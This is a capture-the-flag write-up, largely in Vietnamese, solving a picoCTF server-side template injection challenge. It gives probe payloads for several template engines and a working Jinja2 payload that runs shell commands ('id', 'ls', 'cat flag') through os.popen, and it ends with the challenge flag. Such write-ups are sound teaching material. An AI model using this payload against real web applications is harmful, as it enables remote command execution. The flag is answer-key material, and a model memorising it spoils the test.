#### Description

I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:52544/)!

Hint:
Server Side Template Injection

#SSTI

---

`{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen("cat flag").read()}}`

Đây là trang web mình nhập gì thì nó sẽ in ra thứ đó,

<img width="467" height="163" alt="Pasted image 20251110104131" src="https://github.com/user-attachments/assets/1d6ac4b5-7c49-442f-be4e-9f5f6975d05e" />


Nhập "Hello" thì nó sẽ in ra "Hello", "1 + 1" sẽ ra "1 + 1", và khi tôi nhập "{{1 + 1}}" thì nó sẽ xuất ra "2".

Từ đó tôi tìm hiểu và thấy đây là một lỗ hổng bảo mật Server Side Template Injection (SSTI) (đọc tiêu đề với hint cũng biết rồi =)) ).

Nó xảy ra khi một ứng dụng web nhúng dữ liệu do người dùng cung cấp vào một template phía máy chủ một cách không an toàn.

- Template Engine: các web hiện đại (viết bằng Python, NodeJS, PHP, Java,...) thường dùng TE (như Jinja2, Twig, ES, FreeMarker,...) để tạo HTML động:
	Ví dụ: thay vì code `<h1>Chào HIHI</h1>`, họ sẽ code `<h1>Chào {{username}}`.
- Lỗ hổng xảy ra khi: Ứng dụng nhầm lẫn giữa dữ liệu (tên của bạn) và mã lệnh của template.
	Nếu thay vì nhập tên "John", bạn nhập một chuỗi có cú pháp của template, ví dụ: `{{ 7 * 7 }}`.
    Ứng dụng an toàn: Sẽ hiển thị `Chào {{ 7 * 7 }}` (coi đây là dữ liệu).
    Ứng dụng có lỗ hổng: Sẽ thực thi phép toán và hiển thị `Chào 49` (coi đây là mã lệnh).

-> Nếu thấy số `49` thì mình có thể ra lệnh cho máy chủ (đọc file, truy cập biến, privilege escalation)

| Payload    | Engine có thể là        | Kết quả (nếu lỗi) |
| -------------- | --------------------------- | --------------------- |
| `{{ 7 * 7 }}`  | Jinja2 (Python), Twig (PHP) | `49`                  |
| `${7 * 7}`     | FreeMarker (Java), Mako     | `49`                  |
| `<%= 7 * 7 %>` | EJS (NodeJS)                | `49`                  |
| `#{7 * 7}`     | Ruby (ERB)                  | `49`                  |

Mình kiểm tra xem web này được viết bằng ngôn ngữ nào, thì thấy đây là Python:

<img width="648" height="162" alt="Pasted image 20251110105236" src="https://github.com/user-attachments/assets/9e1ba0fb-d227-4d4e-9362-65e371a120bf" />


Từ đó mình đến [trang](https://www.yeswehack.com/fr/learn-bug-bounty/server-side-template-injection-exploitation) này để tìm kiếm thêm thông tin và lệnh để khai thác nó:
https://www.yeswehack.com/fr/learn-bug-bounty/server-side-template-injection-exploitation

Vì nhập lệnh có dạng `{{}}` nên mình sẽ dùng lệnh khai thác với Jinja2:

```
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen().read()}}
```

Nhập vào web thì thấy bị "Internal Server Error", mình thay `id` vào `()` ở `os.popen()`, thì thấy vẫn lỗi như vậy. 
Thử thêm 2 dấu ngoặc kép "" thì ra được kết quả:

<img width="1192" height="394" alt="Pasted image 20251110105736" src="https://github.com/user-attachments/assets/ed40e7b1-86bf-4f72-8276-e3ef908a6fa1" />


Vậy mình rút ra rằng, chỉ cần để lệnh trong hai dấu "" thì nó sẽ thực thi, thì giờ mình chạy `"ls"` để list ra file có trong thư mục này, mình được trả về thông tin hữu ích dưới đây:

<img width="1161" height="325" alt="Pasted image 20251110105917" src="https://github.com/user-attachments/assets/59ace0b5-be90-4ffb-b2dc-47d0af151180" />


Giờ chỉ cần thay bằng `"cat flag"` là sẽ ra được flag cần tìm:

<img width="973" height="89" alt="Pasted image 20251110105955" src="https://github.com/user-attachments/assets/f7b221b3-1661-4c8f-b062-5893ff6ac3b8" />


=> `picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dcdca99a}`
